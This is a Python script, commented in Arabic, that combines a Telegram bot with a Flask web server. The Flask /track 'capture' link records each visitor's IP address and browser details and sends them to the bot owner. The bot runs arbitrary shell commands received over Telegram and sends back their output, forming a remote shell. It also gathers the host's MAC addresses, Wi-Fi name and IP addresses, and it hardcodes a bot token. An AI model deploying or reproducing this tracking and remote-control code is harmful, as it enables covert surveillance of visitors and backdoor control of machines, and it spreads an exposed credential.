from datetime import datetime
import os
import re
import socket
import subprocess
import threading
from flask import Flask, jsonify, request
import telebot

# ----------------------------------------------------
# الإعدادات الأساسية
# ----------------------------------------------------
TOKEN = "8700445121:AAEe49qNIV_uh3atuSaqt4EXv8RrhVZskE4"
ADMIN_CHAT_ID = 8134363644

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)


# ----------------------------------------------------
# خدمات الـ API (Flask Web Server)
# ----------------------------------------------------
@app.route("/")
def home():
  return "<h1>Server is Running</h1>"


@app.route("/track", methods=["GET"])
def track_ip():
  """endpoint لجلب الـ IP الخاص بالمستخدم عند دخوله للرابط"""
  # محاولة جلب الـ IP الحقيقي في حال وجود proxy أو Nginx
  if request.headers.getlist("X-Forwarded-For"):
    user_ip = request.headers.getlist("X-Forwarded-For")[0].split(",")[0]
  else:
    user_ip = request.remote_addr

  user_agent = request.headers.get("User-Agent", "غير معروف")
  visit_time = datetime.now().strftime("%Y-%m-%d | %I:%M:%S %p")

  # إرسال إشعار مباشر لمالك البوت عبر التليجرام
  alert_msg = (
      f"🚨 **تنبيه: دخول جديد عبر رابط الـ API!**\n\n"
      f"🌐 **عنوان الـ IP:** `{user_ip}`\n"
      f"⏰ **الوقت:** `{visit_time}`\n"
      f"📱 **متصفح/جهاز الزائر:**\n`{user_agent}`"
  )

  try:
    bot.send_message(ADMIN_CHAT_ID, alert_msg, parse_mode="Markdown")
  except Exception as e:
    print(f"[-] خطأ أثناء إرسال إشعار التليجرام: {e}")

  # إرجاع استجابة JSON للزائر
  return jsonify({
      "status": "success",
      "your_ip": user_ip,
      "timestamp": visit_time,
  })


def run_flask():
  """تشغيل خادم الـ API في الخلفية"""
  # يعمل الخادم على جميع الواجهات 0.0.0.0 وعلى المنفذ 5000
  app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)


# ----------------------------------------------------
# وظائف استخراج بيانات الجهاز / السيرفر
# ----------------------------------------------------
def get_connection_type():
  try:
    wifi_name = subprocess.check_output(
        "iwgetid -r 2>/dev/null || nmcli -t -f active,ssid dev wifi | grep '^yes'"
        " | cut -d: -f2",
        shell=True,
    ).decode("utf-8").strip()

    if wifi_name:
      return f"📶 شبكة واي فاي: `{wifi_name}`"

    interfaces = subprocess.check_output(
        "ip route show | grep default", shell=True
    ).decode("utf-8")
    if "wwan" in interfaces or "rmnet" in interfaces or "ppp" in interfaces:
      return "📱 بيانات الهاتف (Cellular Data)"

    return "🌐 اتصال سلكي / شبكة عامة"
  except Exception:
    return "🌐 شبكة عامة"


def get_server_network_info():
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
  except Exception:
    local_ip = "غير معروف"

  try:
    public_ip = (
        subprocess.check_output(
            "curl -s --max-time 3 https://api.ipify.org || wget -qO- --timeout=3"
            " https://api.ipify.org",
            shell=True,
        )
        .decode("utf-8")
        .strip()
    )
    if not public_ip:
      public_ip = "غير معروف"
  except Exception:
    public_ip = "غير معروف"

  try:
    mac_output = subprocess.check_output(
        "ip link || ifconfig", shell=True
    ).decode("utf-8")
    mac_addresses = re.findall(
        r"(?:[0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}", mac_output
    )
    ignored_macs = {"ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"}
    valid_macs = [
        m.lower() for m in set(mac_addresses) if m.lower() not in ignored_macs
    ]

    mac_str = (
        "\n".join([f"    ▪️ `{mac}`" for mac in valid_macs])
        if valid_macs
        else "    ▪️ غير متوفر"
    )
  except Exception:
    mac_str = "    ▪️ غير معروف"

  current_time = datetime.now().strftime("%Y-%m-%d | %I:%M:%S %p")
  connection_info = get_connection_type()

  return (
      f"━━━━━━━━━━━━━━━━━━━\n"
      f"⏱ **الوقت والتاريخ:**\n    `{current_time}`\n"
      f"━━━━━━━━━━━━━━━━━━━\n"
      f"🖥 **بيانات السيرفر الحالي:**\n"
      f"    🔹 IP الداخلي: `{local_ip}`\n"
      f"    🔹 IP الخارجي: `{public_ip}`\n"
      f"━━━━━━━━━━━━━━━━━━━\n"
      f"📌 **عناوين MAC للسيرفر:**\n"
      f"{mac_str}\n"
      f"━━━━━━━━━━━━━━━━━━━\n"
      f"📡 **حالة الاتصال:**\n"
      f"    {connection_info}\n"
      f"━━━━━━━━━━━━━━━━━━━"
  )


def initial_setup():
  print("[*] جاري التحديث وتثبيت المتطلبات...")
  try:
    subprocess.run(
        "apt update && apt install wget git curl wireless-tools -y",
        shell=True,
        check=True,
    )
  except Exception as e:
    print(f"[-] ملاحظة أثناء التحديث: {e}")


# ----------------------------------------------------
# أوامر بوت التليجرام
# ----------------------------------------------------
@bot.message_handler(commands=["start", "info"])
def send_welcome(message):
  user_id = message.from_user.id
  if user_id != ADMIN_CHAT_ID:
    bot.reply_to(message, "⚠️ عذراً، هذا البوت خاص ولا يمكنك استخدامه.")
    return

  net_info = get_server_network_info()
  current_dir = os.getcwd()

  msg_text = (
      f"👋 **أهلاً بك مجدداً!**\n\n"
      f"{net_info}\n\n"
      f"🔗 **رابط الـ API المحلي للالتقاط:**\n`http://localhost:5000/track`\n\n"
      f"📁 **المسار الحالي:**\n`{current_dir}`\n\n"
      f"💡 *أرسل أي أمر تيرمنال للتحكم بالسيرفر.*"
  )

  bot.reply_to(message, msg_text, parse_mode="Markdown")


@bot.message_handler(func=lambda message: True)
def execute_command(message):
  if message.from_user.id != ADMIN_CHAT_ID:
    return

  command = message.text.strip()

  try:
    if command.startswith("cd "):
      new_dir = command[3:].strip()
      os.chdir(new_dir)
      bot.send_message(
          message.chat.id,
          f"📁 تم تغيير المسار إلى:\n`{os.getcwd()}`",
          parse_mode="Markdown",
      )
      return

    result = subprocess.run(
        command, shell=True, capture_output=True, text=True, timeout=120
    )
    output = result.stdout + result.stderr or "✅ تم تنفيذ الأمر بنجاح."

    if len(output) > 4000:
      for x in range(0, len(output), 4000):
        bot.send_message(
            message.chat.id,
            f"```bash\n{output[x : x + 4000]}\n```",
            parse_mode="Markdown",
        )
    else:
      bot.send_message(
          message.chat.id, f"```bash\n{output}\n```", parse_mode="Markdown"
      )

  except Exception as e:
    bot.send_message(
        message.chat.id, f"❌ حدث خطأ:\n`{str(e)}`", parse_mode="Markdown"
    )


# ----------------------------------------------------
# نقطة التشغيل الرئيسية (Multithreading)
# ----------------------------------------------------
if __name__ == "__main__":
  initial_setup()

  # تشغيل سيرفر الـ API في مسار منفصل (Thread)
  flask_thread = threading.Thread(target=run_flask)
  flask_thread.daemon = True
  flask_thread.start()
  print("[*] تم تشغيل سيرفر الـ API على المنفذ 5000...")

  # تشغيل بوت التليجرام
  print("[*] Cloud Bot is running...")
  bot.infinity_polling()
